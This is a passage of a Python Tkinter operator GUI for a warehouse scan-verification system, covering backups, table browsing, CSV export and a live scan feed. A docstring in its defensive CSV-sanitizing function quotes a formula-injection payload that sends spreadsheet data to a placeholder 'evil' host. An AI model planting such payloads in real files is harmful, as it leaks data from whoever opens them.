#!/usr/bin/env python3
"""Operator GUI -- a Tkinter desktop app, not a web admin page.

Nine tabs: Overview, Tables, Live feed, Normalizer playground, Accounts,
Manifests & shifts, Billing, SQL console, Server control. Utilitarian and
information-dense -- no styling ambition, unlike the worker/owner web
surfaces.

Threading: all DB reads/writes and subprocess I/O happen off the Tk main
thread. Work is submitted to a background thread; results are marshalled
back to the main thread through a queue.Queue, drained on a `self.after()`
timer -- Tkinter itself is never touched from a worker thread.

Local vs remote: every tab calls AdminApp.call()/call_action()/call_sql()
instead of touching the database directly. In local mode (the historical
behavior -- db_path points at a file on this machine) those open a
connection and call straight into admin_api.RPC_OPS/ACTION_OPS in-process.
In remote mode (remote_url + token given, e.g. running this GUI on your
own computer against a PythonAnywhere-hosted deployment with no SSH/
filesystem access) the same operation names are POSTed to that server's
/admin-api/* routes instead. Either way it's the exact same server-side
logic in admin_api.py -- see that module's docstring.
"""

from __future__ import annotations

import base64
import contextlib
import csv
import json
import queue
import subprocess
import sys
import threading
import tkinter as tk
import urllib.error
import urllib.parse
import urllib.request
import webbrowser
from datetime import UTC, datetime
from functools import partial
from pathlib import Path
from tkinter import filedialog, messagebox, scrolledtext, simpledialog, ttk
from typing import ClassVar, cast

import segno

import admin_api
import backup
import barcode
import db
import pricing
import reports
import tz

GEOMETRY_FILE = Path.home() / ".autorack_verify_gui.json"
BASE_DIR = Path(__file__).parent

READ_ONLY_PREFIXES = ("select", "pragma", "explain", "with")
AUTO_BACKUP_INTERVAL_MS = 30 * 60 * 1000  # every 30 minutes while the GUI is open

# Leading characters that Excel/Sheets/Numbers treat as the start of a
# formula rather than literal text when a cell is opened from a CSV.
_CSV_FORMULA_TRIGGERS = ("=", "+", "-", "@", "\t", "\r")


def _csv_safe_cell(value):
    """Neutralize CSV/formula injection (OWASP) before writing a cell.

    Every string value the CSV exporters below write ultimately traces
    back to something a warehouse worker or account owner typed --
    manifest SKU/description, a worker's appeal note, an account's
    business name -- and self-service signup means that can now be a
    complete stranger. A cell like `=HYPERLINK("http://evil/steal?"&A1)`
    is inert as stored data but becomes a live, executing formula the
    instant an operator opens the exported CSV in a spreadsheet app.
    Prefixing with a single quote is the standard mitigation: every
    common spreadsheet app treats a leading `'` as "this cell is text,"
    which both defuses the formula and is invisible in the rendered
    cell (Excel/Sheets/Numbers all strip a leading `'` from display).
    """
    if isinstance(value, str) and value.startswith(_CSV_FORMULA_TRIGGERS):
        return "'" + value
    return value


# ---------------------------------------------------------------------------
# Async plumbing: background thread -> queue -> after()
# ---------------------------------------------------------------------------


class AsyncRunner:
    def __init__(self, root: tk.Tk):
        self.root = root
        self.q: queue.Queue = queue.Queue()
        self._job: str | None = self.root.after(50, self._drain)
        self._threads: list[threading.Thread] = []
        self._threads_lock = threading.Lock()

    def submit(self, fn, callback):
        def worker():
            try:
                result = fn()
            except Exception as exc:
                result = exc
            self.q.put((callback, result))

        thread = threading.Thread(target=worker, daemon=True)
        with self._threads_lock:
            self._threads.append(thread)
        thread.start()

    def join_all(self, timeout: float = 3.0) -> bool:
        """Wait for every in-flight background thread to finish. A
        daemon thread that outlives its AdminApp (e.g. one test's DB
        query still running when the next test starts constructing a
        fresh app) isn't just a leak -- it can race a concurrent Python
        GC pass against a C-level SQLite call from an unrelated thread
        and crash the whole interpreter (seen in practice: "Fatal Python
        error: Aborted" from exactly this interleaving). Callers -- test
        fixtures, mainly -- should call this before tearing down. Returns
        True if every thread finished within the timeout.
        """
        with self._threads_lock:
            threads = list(self._threads)
        all_done = True
        for t in threads:
            t.join(timeout=timeout)
            if t.is_alive():
                all_done = False
        with self._threads_lock:
            self._threads = [t for t in self._threads if t.is_alive()]
        return all_done

    def _drain(self):
        try:
            while True:
                callback, result = self.q.get_nowait()
                callback(result)
        except queue.Empty:
            pass
        self._job = self.root.after(50, self._drain)

    def cancel(self):
        # Cancelling the *scheduled* Tcl-level event (not just checking a
        # Python flag inside the callback) matters: a flag check happens
        # too late -- Tcl tries to invoke the callback's dead command name
        # and raises "invalid command name" even if the callback would
        # have no-opped, because that failure happens at dispatch time,
        # before any Python code runs.
        if self._job is not None:
            with contextlib.suppress(tk.TclError):
                self.root.after_cancel(self._job)
            self._job = None


def is_error(result) -> bool:
    return isinstance(result, Exception)


# ---------------------------------------------------------------------------
# Settings (server URL, geometry) persisted to a dotfile
# ---------------------------------------------------------------------------


def load_settings() -> dict:
    try:
        return json.loads(GEOMETRY_FILE.read_text())
    except Exception:
        return {}


def save_settings(data: dict) -> None:
    with contextlib.suppress(Exception):
        GEOMETRY_FILE.write_text(json.dumps(data, indent=2))


# ---------------------------------------------------------------------------
# Main application
# ---------------------------------------------------------------------------


# Schemes urllib may be pointed at in remote mode. --remote-url comes from
# whoever launched the GUI, so this is not an untrusted-input boundary in
# the usual sense -- but urllib.request.urlopen happily opens file:// and
# ftp://, and a mistyped or copy-pasted argument that silently reads a
# local file and parses it as an API response is a confusing failure at
# best. Restricting to HTTP(S) makes a wrong URL fail immediately and by
# name.
_ALLOWED_REMOTE_SCHEMES = ("http", "https")


def _validate_remote_url(remote_url: str) -> str:
    """Normalise --remote-url, rejecting anything that is not HTTP(S)."""
    cleaned = remote_url.rstrip("/")
    scheme = urllib.parse.urlparse(cleaned).scheme.lower()
    if scheme not in _ALLOWED_REMOTE_SCHEMES:
        raise ValueError(
            f"--remote-url must be http:// or https://, got {scheme or 'no scheme'}: {remote_url}"
        )
    return cleaned


class DialogWindow(tk.Toplevel):
    """A dialog window that carries its own form state.

    Several dialogs here build widgets in one function and read them back
    in a nested callback, and stash the Tk variables on the window to
    bridge the two. That works on a plain tk.Toplevel -- Python lets you
    set any attribute -- but nothing then declares what a given dialog is
    expected to hold, so a typo in a callback fails at click time rather
    than at import. Declaring the slots keeps that pattern and makes it
    checkable.

    These are declarations, not defaults: no dialog uses all of them, and
    each assigns the ones it needs before any callback can fire. A dialog
    that forgets one still raises AttributeError, exactly as before.
    """

    cred_var: tk.StringVar
    tz_var: tk.StringVar
    email_var: tk.StringVar
    role_var: tk.StringVar
    field_vars: dict[str, tk.StringVar]


class AdminApp(tk.Tk):
    def __init__(self, db_path=None, remote_url=None, token=None):
        super().__init__()
        # Every recurring self.after() timer in this app (background
        # backups, tab auto-refreshes, the async-runner drain loop) checks
        # this flag before rescheduling itself. Without it, destroying the
        # window (as every test does, many times per process) leaves
        # Tcl-level timers behind that fire against a dead interpreter --
        # harmless in isolation, but they pile up across a growing test
        # suite and occasionally stall an unrelated later test.
        self._closing = False
        self.db_path = Path(db_path) if db_path else db.DEFAULT_DB_PATH
        # Remote mode: db_path above is unused for data access (there's no
        # local file), but stays set to something sane since a few local
        # display paths (Server control's serve.py invocation) reference
        # it -- those are already disabled in remote mode, see
        # ServerControlTab.
        self.remote_url = _validate_remote_url(remote_url) if remote_url else None
        self.token = token
        self.settings = load_settings()
        self.base_url = self.settings.get("base_url", "https://127.0.0.1:8443")
        self.server_process: subprocess.Popen | None = None

        title = "Autorack Verify -- Operator"
        if self.remote_url:
            title += f"  [remote: {self.remote_url}]"
        self.title(title)
        geometry = self.settings.get("geometry", "1280x860")
        self.geometry(geometry)

        if self.remote_url:
            try:
                self.ping_remote()
            except Exception as e:
                messagebox.showerror(
                    "Remote connection failed",
                    f"Could not reach {self.remote_url}:\n\n{e}\n\n"
                    "Every tab will show errors until this is fixed -- check the "
                    "URL and token, then restart.",
                )

        self.runner = AsyncRunner(self)
        self._build_style()

        self.notebook = ttk.Notebook(self)
        self.notebook.pack(fill="both", expand=True)

        self.tabs = {}
        for name, cls in [
            ("Overview", OverviewTab),
            ("Tables", TablesTab),
            ("Live feed", LiveFeedTab),
            ("Normalizer playground", NormalizerTab),
            ("Accounts", AccountsTab),
            ("Manifests & shifts", ManifestsShiftsTab),
            ("Billing", BillingTab),
            ("SQL console", SqlConsoleTab),
            ("Server control", ServerControlTab),
        ]:
            frame = cls(self.notebook, self)
            self.notebook.add(frame, text=name)
            self.tabs[name] = frame

        self.protocol("WM_DELETE_WINDOW", self._on_close)
        # Remote mode's "backup" is a real network request -- a full hot
        # copy of the server's DB (plus every appeal photo, base64'd) shipped
        # over HTTP every 30 minutes unattended is real load against
        # someone else's host (and its CPU-second/disk quota on something
        # like PythonAnywhere's free tier), not a free local disk copy.
        # Remote operators can still hit "Backup now" by hand.
        self._backup_job: str | None = (
            None if self.remote_url else self.after(AUTO_BACKUP_INTERVAL_MS, self._auto_backup_tick)
        )

    def _auto_backup_tick(self):
        self.run_backup_now(silent=True)
        self._backup_job = self.after(AUTO_BACKUP_INTERVAL_MS, self._auto_backup_tick)

    def run_backup_now(self, silent: bool = False):
        def work():
            return self.call_backup()

        def apply(result):
            if "Overview" not in self.tabs:
                return
            overview = cast("OverviewTab", self.tabs["Overview"])
            overview.note_backup_result(result, silent)

        self.run_async(work, apply)

    def call_backup(self) -> backup.BackupResult:
        """Returns {"db": Path, "photos": Path|None} in both modes -- the
        same shape backup.backup_everything already returns locally.
        Remote mode's files land in backup.DEFAULT_BACKUP_DIR too (the
        same folder local mode writes to), so OverviewTab's backup list
        and restore flow don't need to know which mode produced them."""
        if not self.remote_url:
            return backup.backup_everything(self.db_path)
        result = self._remote_request("/admin-api/backup", {})
        backup_dir = backup.DEFAULT_BACKUP_DIR
        backup_dir.mkdir(parents=True, exist_ok=True)
        db_dest = backup_dir / result["db"]["filename"]
        db_dest.write_bytes(base64.b64decode(result["db"]["content_b64"]))
        photos_dest = None
        if result.get("photos"):
            photos_dest = backup_dir / result["photos"]["filename"]
            photos_dest.write_bytes(base64.b64decode(result["photos"]["content_b64"]))
        return {"db": db_dest, "photos": photos_dest}

    def call_restore(self, kind: str, backup_path: Path) -> None:
        if not self.remote_url:
            if kind == "photos":
                photos_dir = Path(self.db_path).parent / "appeal_photos"
                backup.restore_appeal_photos(backup_path, photos_dir)
            else:
                backup.backup_database(self.db_path)  # safety snapshot of current state first
                backup.restore_backup(backup_path, self.db_path)
            return
        content_b64 = base64.b64encode(backup_path.read_bytes()).decode("ascii")
        self._remote_request(
            "/admin-api/restore",
            {"kind": kind, "filename": backup_path.name, "content_b64": content_b64},
        )

    def _build_style(self):
        style = ttk.Style(self)
        for theme in ("clam", "alt", "default"):
            try:
                style.theme_use(theme)
                break
            except tk.TclError:
                continue
        style.configure("Treeview", rowheight=22)
        style.configure("Bad.TLabel", foreground="#c62828")
        style.configure("Good.TLabel", foreground="#1e7d3c")

    def new_conn(self):
        return db.connect(self.db_path)

    def call(self, fn, **params):  # type: ignore[override]
        """Read-only lookup -- see admin_api.RPC_OPS for the operation
        catalog. Raises on failure; always call this from inside a
        run_async() work() closure so AsyncRunner's existing
        exception-to-error-result handling (is_error()) applies."""
        if self.remote_url:
            return self._remote_request("/admin-api/rpc", {"fn": fn, "params": params})
        handler = admin_api.RPC_OPS[fn]
        conn = self.new_conn()
        try:
            p = dict(params)
            p["db_path"] = str(self.db_path)
            return handler(conn, p)
        finally:
            conn.close()

    def call_action(self, fn, **params):
        """Mutating operation -- see admin_api.ACTION_OPS. Each handler
        performs its own db.record_audit() call before mutating, tagged
        'operator-gui' here (local mode) or 'operator-api:<addr>' server
        side (remote mode) -- see admin_api.py."""
        if self.remote_url:
            return self._remote_request("/admin-api/action", {"fn": fn, "params": params})
        handler = admin_api.ACTION_OPS[fn]
        conn = self.new_conn()
        try:
            return handler(conn, "operator-gui", dict(params))
        finally:
            conn.close()

    def call_sql(self, sql: str, unsafe: bool = False):
        if self.remote_url:
            return self._remote_request("/admin-api/sql", {"sql": sql, "unsafe": unsafe})
        conn = self.new_conn()
        try:
            return admin_api.run_sql(conn, sql, unsafe, "operator-gui")
        finally:
            conn.close()

    def _remote_request(self, path: str, payload: dict):
        # Only reachable in remote mode, where remote_url is always set --
        # every caller checks `if self.remote_url` first.
        assert self.remote_url is not None
        url = self.remote_url + path
        data = json.dumps(payload).encode("utf-8")
        req = urllib.request.Request(
            url,
            data=data,
            method="POST",
            headers={
                "Content-Type": "application/json",
                "Authorization": f"Bearer {self.token or ''}",
            },
        )
        try:
            with urllib.request.urlopen(req, timeout=20) as resp:
                body = json.loads(resp.read().decode("utf-8"))
        except urllib.error.HTTPError as e:
            try:
                body = json.loads(e.read().decode("utf-8"))
                raise RuntimeError(body.get("error", f"HTTP {e.code}")) from e
            except (ValueError, json.JSONDecodeError):
                raise RuntimeError(f"HTTP {e.code}: {e.reason}") from e
        except urllib.error.URLError as e:
            raise RuntimeError(f"could not reach {self.remote_url}: {e.reason}") from e
        if "error" in body:
            raise RuntimeError(body["error"])
        return body.get("result")

    def ping_remote(self) -> bool:
        """GET /admin-api/ping -- called once at startup in remote mode so
        a bad URL/token fails fast with one clear message instead of every
        tab silently showing 'Disconnected'."""
        req = urllib.request.Request(
            f"{self.remote_url}/admin-api/ping",
            headers={"Authorization": f"Bearer {self.token or ''}"},
        )
        with urllib.request.urlopen(req, timeout=10) as resp:
            body = json.loads(resp.read().decode("utf-8"))
        return bool(body.get("ok"))

    def run_async(self, fn, callback):
        self.runner.submit(fn, callback)

    def _on_close(self):
        self.settings["geometry"] = self.geometry()
        self.settings["base_url"] = self.base_url
        save_settings(self.settings)
        if self.server_process and self.server_process.poll() is None:
            self.server_process.terminate()
        self.destroy()

    def destroy(self):
        # Explicitly cancel every recurring self.after() timer -- this
        # class's own, each tab's, and the AsyncRunner's -- before tearing
        # down. A Python-side "are we closing" flag checked inside the
        # callback is not enough: Tcl still has the *next* firing of an
        # uncancelled timer queued at the interpreter level, and it will
        # try to invoke that timer's command name regardless of what the
        # Python callback body would have done, raising "invalid command
        # name" once the interpreter is gone. Only after_cancel() removes
        # the pending event itself. However destroy() was reached --
        # window-close or a test calling it directly -- this runs first.
        self._closing = True
        if getattr(self, "_backup_job", None) is not None:
            with contextlib.suppress(tk.TclError):
                if self._backup_job is not None:
                    self.after_cancel(self._backup_job)
            self._backup_job = None
        if getattr(self, "runner", None) is not None:
            self.runner.cancel()
            # Wait for any background DB/subprocess thread that's still
            # running to actually finish, rather than abandoning it. Once
            # the drain timer above is cancelled nothing will ever consume
            # what it puts on the queue, so this is purely about not
            # leaving a daemon thread alive past this process's use of
            # this app instance -- a thread from one AdminApp that's still
            # running when the NEXT one starts (e.g. across tests in the
            # same process) can race a concurrent GC pass against a
            # C-level SQLite call on another thread and abort the whole
            # interpreter, not just misbehave.
            self.runner.join_all(timeout=3.0)
        for tab in getattr(self, "tabs", {}).values():
            cancel_timers = getattr(tab, "cancel_timers", None)
            if cancel_timers:
                cancel_timers()
        super().destroy()


# ---------------------------------------------------------------------------
# Tab 1: Overview
# ---------------------------------------------------------------------------


class OverviewTab(ttk.Frame):
    LOCAL_REFRESH_MS = 5000
    REMOTE_REFRESH_MS = 30000  # a local SQLite query is free; the same poll over HTTP against someone else's host isn't

    def __init__(self, parent, app: AdminApp):
        super().__init__(parent)
        self.app = app
        self._build()
        self.refresh()
        interval = self.REMOTE_REFRESH_MS if self.app.remote_url else self.LOCAL_REFRESH_MS
        self._refresh_job: str | None = self.after(interval, self._auto_refresh)

    def cancel_timers(self):
        if self._refresh_job is not None:
            with contextlib.suppress(tk.TclError):
                self.after_cancel(self._refresh_job)
            self._refresh_job = None

    def _build(self):
        top = ttk.Frame(self, padding=10)
        top.pack(fill="x")
        self.conn_label = ttk.Label(top, text="Connecting...")
        self.conn_label.grid(row=0, column=0, sticky="w", padx=(0, 20))
        self.db_label = ttk.Label(top, text="")
        self.db_label.grid(row=0, column=1, sticky="w", padx=(0, 20))
        self.wal_label = ttk.Label(top, text="")
        self.wal_label.grid(row=0, column=2, sticky="w")
        ttk.Button(top, text="Refresh", command=self.refresh).grid(row=0, column=3, padx=10)

        stats = ttk.Frame(self, padding=10)
        stats.pack(fill="x")
        self.stat_labels = {}
        for i, key in enumerate(["Accounts", "Active shifts", "Scans today", "Open exceptions"]):
            box = ttk.LabelFrame(stats, text=key, padding=10)
            box.grid(row=0, column=i, padx=8, sticky="ew")
            lbl = ttk.Label(box, text="--", font=("TkDefaultFont", 18, "bold"))
            lbl.pack()
            self.stat_labels[key] = lbl
            stats.columnconfigure(i, weight=1)

        backup_frame = ttk.LabelFrame(self, text="Backups (backup_data/)", padding=10)
        backup_frame.pack(fill="x", padx=10, pady=(0, 10))
        btn_row = ttk.Frame(backup_frame)
        btn_row.pack(fill="x")
        ttk.Button(btn_row, text="Backup now", command=self._backup_now).pack(side="left")
        ttk.Button(btn_row, text="Restore selected...", command=self._restore_selected).pack(
            side="left", padx=6
        )
        self.backup_status_label = ttk.Label(
            btn_row, text=f"Auto-backup every {AUTO_BACKUP_INTERVAL_MS // 60000} min."
        )
        self.backup_status_label.pack(side="left", padx=10)
        self.backup_list = ttk.Treeview(
            backup_frame, columns=("type", "file", "size", "modified"), show="headings", height=5
        )
        for col, width in [("type", 80), ("file", 260), ("size", 90), ("modified", 160)]:
            self.backup_list.heading(col, text=col)
            self.backup_list.column(col, width=width)
        self.backup_list.pack(fill="x", pady=(8, 0))
        self._refresh_backup_list()

        chart_frame = ttk.LabelFrame(self, text="Scan volume, last 24 hours", padding=10)
        chart_frame.pack(fill="both", expand=True, padx=10, pady=10)
        self.canvas = tk.Canvas(chart_frame, background="white", height=260)
        self.canvas.pack(fill="both", expand=True)
        self.canvas.bind("<Configure>", lambda e: self._redraw())
        self._hourly_counts = [0] * 24

    def _auto_refresh(self):
        self.refresh()
        interval = self.REMOTE_REFRESH_MS if self.app.remote_url else self.LOCAL_REFRESH_MS
        self._refresh_job = self.after(interval, self._auto_refresh)

    def _backup_now(self):
        self.backup_status_label.configure(text="Backing up...")
        self.app.run_backup_now(silent=False)

    def note_backup_result(self, result, silent: bool):
        if is_error(result):
            self.backup_status_label.configure(text=f"Backup failed: {result}")
            if not silent:
                messagebox.showerror("Backup", str(result))
            return
        label = f"Last backup: {result['db'].name}"
        if result["photos"]:
            label += f" + {result['photos'].name}"
        self.backup_status_label.configure(text=label)
        self._refresh_backup_list()

    def _refresh_backup_list(self):
        for item in self.backup_list.get_children():
            self.backup_list.delete(item)
        # In remote mode self.app.db_path is a local placeholder (there's
        # no local db file), so filtering by its stem would hide the
        # downloaded backups -- list everything in the folder instead.
        stem = None if self.app.remote_url else self.app.db_path.stem
        db_backups = [(p, "Database") for p in backup.list_backups(stem=stem)]
        photo_backups = [(p, "Photos") for p in backup.list_photo_backups()]
        rows = sorted(db_backups + photo_backups, key=lambda r: r[0].stat().st_mtime, reverse=True)
        for path, kind in rows:
            stat = path.stat()
            size_kb = f"{stat.st_size / 1024:.1f} KB"
            # Backup files sit on this machine and this list is read by
            # someone sitting at it, so local time is the right display --
            # unlike stored timestamps, which are UTC everywhere (see tz.py).
            modified = (
                datetime.fromtimestamp(stat.st_mtime, UTC)
                .astimezone()
                .strftime("%Y-%m-%d %H:%M:%S")
            )
            self.backup_list.insert(
                "", "end", iid=str(path), values=(kind, path.name, size_kb, modified)
            )

    def _restore_selected(self):
        sel = self.backup_list.selection()
        if not sel:
            messagebox.showinfo("Restore", "Select a backup from the list first.")
            return
        backup_path = Path(sel[0])
        is_photos = backup_path.suffix == ".zip"
        target_desc = "appeal photos" if is_photos else "the live database"
        if not messagebox.askyesno(
            "Restore backup",
            f"Restore {backup_path.name} over {target_desc}?\n\n"
            + (
                "Existing photos are overwritten by same-named files in the backup; newer photos are left alone."
                if is_photos
                else "This replaces all current data with this backup's contents. This cannot be undone."
            ),
        ):
            return

        def work():
            self.app.call_restore("photos" if is_photos else "db", backup_path)
            return True

        def apply(result):
            if is_error(result):
                messagebox.showerror("Restore", str(result))
            elif is_photos:
                messagebox.showinfo("Restore", "Appeal photos restored.")
                self._refresh_backup_list()
            else:
                messagebox.showinfo(
                    "Restore",
                    "Database restored. Restart the operator GUI and server to pick up the change.",
                )
                self._refresh_backup_list()

        self.app.run_async(work, apply)

    def refresh(self):
        def work():
            return self.app.call("overview_stats")

        self.app.run_async(work, self._apply)

    def _apply(self, result):
        if is_error(result):
            self.conn_label.configure(text=f"Disconnected: {result}", style="Bad.TLabel")
            return
        self.conn_label.configure(text="Connected", style="Good.TLabel")
        self.db_label.configure(
            text=f"DB: {result.get('db_path', self.app.db_path)}  ({result['size'] / 1024:.1f} KB)"
        )
        self.wal_label.configure(text=f"WAL pending: {result['wal_size'] / 1024:.1f} KB")
        self.stat_labels["Accounts"].configure(text=str(result["accounts"]))
        self.stat_labels["Active shifts"].configure(text=str(result["active_shifts"]))
        self.stat_labels["Scans today"].configure(text=str(result["scans_today"]))
        self.stat_labels["Open exceptions"].configure(text=str(result["open_exceptions"]))
        self._hourly_counts = result["hourly"]
        self._redraw()

    def _redraw(self):
        c = self.canvas
        c.delete("all")
        w = c.winfo_width() or 800
        h = c.winfo_height() or 260
        counts = self._hourly_counts
        max_n = max(counts) or 1
        margin = 30
        bar_area_w = w - 2 * margin
        bar_w = bar_area_w / 24
        for i, n in enumerate(counts):
            bar_h = (h - 2 * margin) * (n / max_n)
            x0 = margin + i * bar_w + 2
            x1 = margin + (i + 1) * bar_w - 2
            y1 = h - margin
            y0 = y1 - bar_h
            c.create_rectangle(x0, y0, x1, y1, fill="#f4b400", outline="#14171a")
            if i % 3 == 0:
                c.create_text((x0 + x1) / 2, y1 + 12, text=f"{i:02d}h", font=("TkDefaultFont", 7))
        c.create_line(margin, h - margin, w - margin, h - margin, fill="#14171a")


# ---------------------------------------------------------------------------
# Tab 2: Tables -- generic browser for every table
# ---------------------------------------------------------------------------


class TablesTab(ttk.Frame):
    PAGE_SIZE = 100

    def __init__(self, parent, app: AdminApp):
        super().__init__(parent)
        self.app = app
        self.table = db.KNOWN_TABLES[0]
        self.columns: list[str] = []
        self.offset = 0
        self.total = 0
        self.order_by = None
        self.order_dir = "DESC"
        self.filter_vars: dict[str, tk.StringVar] = {}
        self._build()
        self._load_columns_and_refresh()

    def _build(self):
        top = ttk.Frame(self, padding=6)
        top.pack(fill="x")
        ttk.Label(top, text="Table:").pack(side="left")
        self.table_combo = ttk.Combobox(top, values=db.KNOWN_TABLES, state="readonly", width=24)
        self.table_combo.set(self.table)
        self.table_combo.pack(side="left", padx=6)
        self.table_combo.bind("<<ComboboxSelected>>", self._on_table_change)
        ttk.Button(top, text="Export CSV", command=self._export_csv).pack(side="left", padx=6)
        self.page_label = ttk.Label(top, text="")
        self.page_label.pack(side="right", padx=6)
        ttk.Button(top, text="Next >", command=self._next_page).pack(side="right")
        ttk.Button(top, text="< Prev", command=self._prev_page).pack(side="right")

        self.filter_frame = ttk.Frame(self, padding=(6, 0))
        self.filter_frame.pack(fill="x")

        body = ttk.Frame(self)
        body.pack(fill="both", expand=True)

        self.tree = ttk.Treeview(body, show="headings")
        vsb = ttk.Scrollbar(body, orient="vertical", command=self.tree.yview)
        hsb = ttk.Scrollbar(body, orient="horizontal", command=self.tree.xview)
        self.tree.configure(yscrollcommand=vsb.set, xscrollcommand=hsb.set)
        self.tree.grid(row=0, column=0, sticky="nsew")
        vsb.grid(row=0, column=1, sticky="ns")
        hsb.grid(row=1, column=0, sticky="ew")
        body.rowconfigure(0, weight=1)
        body.columnconfigure(0, weight=1)
        self.tree.bind("<<TreeviewSelect>>", self._on_select)

        detail_frame = ttk.LabelFrame(self, text="Row detail", padding=6)
        detail_frame.pack(fill="x")
        self.detail_text = scrolledtext.ScrolledText(detail_frame, height=6, wrap="word")
        self.detail_text.pack(fill="x")

    def _on_table_change(self, _evt=None):
        self.table = self.table_combo.get()
        self.offset = 0
        self.order_by = None
        self._load_columns_and_refresh()

    def _load_columns_and_refresh(self):
        def work():
            return self.app.call("table_columns", table=self.table)

        def apply(columns):
            if is_error(columns):
                messagebox.showerror("Tables", str(columns))
                return
            self.columns = columns
            self.tree.configure(columns=columns)
            for col in columns:
                self.tree.heading(col, text=col, command=partial(self._sort_by, col))
                self.tree.column(col, width=110, stretch=True)
            for w in self.filter_frame.winfo_children():
                w.destroy()
            self.filter_vars = {}
            for col in columns:
                cell = ttk.Frame(self.filter_frame)
                cell.pack(side="left", padx=2)
                ttk.Label(cell, text=col, font=("TkDefaultFont", 7)).pack()
                var = tk.StringVar()
                entry = ttk.Entry(cell, textvariable=var, width=12)
                entry.pack()
                entry.bind("<Return>", lambda e: self._refresh())
                self.filter_vars[col] = var
            self._refresh()

        self.app.run_async(work, apply)

    def _sort_by(self, col):
        if self.order_by == col:
            self.order_dir = "ASC" if self.order_dir == "DESC" else "DESC"
        else:
            self.order_by = col
            self.order_dir = "DESC"
        self._refresh()

    def _refresh(self):
        filters = {c: v.get() for c, v in self.filter_vars.items() if v.get()}

        def work():
            return self.app.call(
                "table_page",
                table=self.table,
                limit=self.PAGE_SIZE,
                offset=self.offset,
                order_by=self.order_by,
                order_dir=self.order_dir,
                filters=filters,
            )

        def apply(result):
            if is_error(result):
                messagebox.showerror("Tables", str(result))
                return
            rows, total = result["rows"], result["total"]
            self.total = total
            for item in self.tree.get_children():
                self.tree.delete(item)
            for row in rows:
                values = [row[c] for c in self.columns]
                self.tree.insert("", "end", values=values)
            page = self.offset // self.PAGE_SIZE + 1
            pages = max(1, (total + self.PAGE_SIZE - 1) // self.PAGE_SIZE)
            self.page_label.configure(text=f"Page {page}/{pages} ({total} rows)")

        self.app.run_async(work, apply)

    def _next_page(self):
        if self.offset + self.PAGE_SIZE < self.total:
            self.offset += self.PAGE_SIZE
            self._refresh()

    def _prev_page(self):
        if self.offset > 0:
            self.offset = max(0, self.offset - self.PAGE_SIZE)
            self._refresh()

    def _on_select(self, _evt=None):
        sel = self.tree.selection()
        if not sel:
            return
        values = self.tree.item(sel[0], "values")
        lines = [f"{c}: {v}" for c, v in zip(self.columns, values, strict=False)]
        self.detail_text.delete("1.0", "end")
        self.detail_text.insert("1.0", "\n".join(lines))

    def _export_csv(self):
        path = filedialog.asksaveasfilename(
            defaultextension=".csv", initialfile=f"{self.table}.csv"
        )
        if not path:
            return
        filters = {c: v.get() for c, v in self.filter_vars.items() if v.get()}

        def work():
            # table_page is capped server side (see admin_api.MAX_TABLE_PAGE_LIMIT)
            # so a single unbounded fetch isn't possible even locally anymore
            # -- page through it instead. Fine for an operator-triggered
            # export; nothing here is on a path a worker phone waits on.
            all_rows = []
            offset = 0
            page_size = admin_api.MAX_TABLE_PAGE_LIMIT
            while True:
                page = self.app.call(
                    "table_page",
                    table=self.table,
                    limit=page_size,
                    offset=offset,
                    order_by=self.order_by,
                    order_dir=self.order_dir,
                    filters=filters,
                )
                all_rows.extend(page["rows"])
                offset += page_size
                if len(page["rows"]) < page_size or offset >= page["total"]:
                    break
            with open(path, "w", newline="") as f:
                writer = csv.writer(f)
                writer.writerow(self.columns)
                for row in all_rows:
                    writer.writerow([_csv_safe_cell(row[c]) for c in self.columns])
            return len(all_rows)

        def apply(result):
            if is_error(result):
                messagebox.showerror("Export", str(result))
            else:
                messagebox.showinfo("Export", f"Wrote {result} rows to {path}")

        self.app.run_async(work, apply)


# ---------------------------------------------------------------------------
# Tab 3: Live feed
# ---------------------------------------------------------------------------


class LiveFeedTab(ttk.Frame):
    COLUMNS: ClassVar[list[str]] = [
        "ts_server",
        "result",
        "raw_payload",
        "matched_tier",
        "worker",
        "account",
    ]
    LOCAL_POLL_MS = 2000
    REMOTE_POLL_MS = 10000  # a 5-way JOIN over scans every 2s is fine locally; every 2s over HTTP against someone else's host isn't

    def __init__(self, parent, app: AdminApp):
        super().__init__(parent)
        self.app = app
        self.paused = False
        self.last_seen_uuid = None
        self._tick_job: str | None = None
        self._build()
        self._tick()

    def cancel_timers(self):
        if self._tick_job is not None:
            with contextlib.suppress(tk.TclError):
                self.after_cancel(self._tick_job)
            self._tick_job = None

    def _build(self):
        top = ttk.Frame(self, padding=6)
        top.pack(fill="x")
        self.pause_btn = ttk.Button(top, text="Pause", command=self._toggle_pause)
        self.pause_btn.pack(side="left")

        self.tree = ttk.Treeview(self, columns=self.COLUMNS, show="headings")
        for col in self.COLUMNS:
            self.tree.heading(col, text=col)
            self.tree.column(col, width=140)
        self.tree.tag_configure("ok", background="#dcf1e2")
        self.tree.tag_configure("reject", background="#fbdada")
        self.tree.tag_configure("duplicate", background="#fbe8cc")
        self.tree.tag_configure("unresolved", background="#e4e6ea")
        self.tree.pack(fill="both", expand=True)
        self.tree.bind("<Double-1>", self._open_forensics)
        self._row_scan_uuid: dict[str, str] = {}

    def _toggle_pause(self):
        self.paused = not self.paused
        self.pause_btn.configure(text="Resume" if self.paused else "Pause")

    def _tick(self):
        if not self.paused:
            self._poll()
        interval = self.REMOTE_POLL_MS if self.app.remote_url else self.LOCAL_POLL_MS
        self._tick_job = self.after(interval, self._tick)

    def _poll(self):
        def work():
            return self.app.call("live_feed")

        self.app.run_async(work, self._apply)

    def _apply(self, rows):
        if is_error(rows):
            return
        for item in self.tree.get_children():
            self.tree.delete(item)
        self._row_scan_uuid = {}
        for row in rows:
            values = [row[c] for c in self.COLUMNS]
            item = self.tree.insert("", "end", values=values, tags=(row["result"],))
            self._row_scan_uuid[item] = row["uuid"]

    def _open_forensics(self, _evt=None):
        sel = self.tree.selection()
        if not sel:
            return
        scan_uuid = self._row_scan_uuid.get(sel[0])
        if not scan_uuid:
            return
        open_forensic_panel(self.app, scan_uuid)


def open_forensic_panel(app: AdminApp, scan_uuid: str):
    win = DialogWindow(app)
    win.title(f"Forensics -- {scan_uuid}")
    win.geometry("760x640")
    text = scrolledtext.ScrolledText(win, wrap="word", font=("TkFixedFont", 10))
    text.pack(fill="both", expand=True)
    text.insert("1.0", "Loading...")

    def work():
        return app.call("scan_forensics", scan_uuid=scan_uuid)

    def apply(result):
        text.delete("1.0", "end")
        if is_error(result) or "error" in result:
            text.insert("1.0", f"Error: {result}")
            return
        # Remote mode round-trips this through JSON, which stringifies
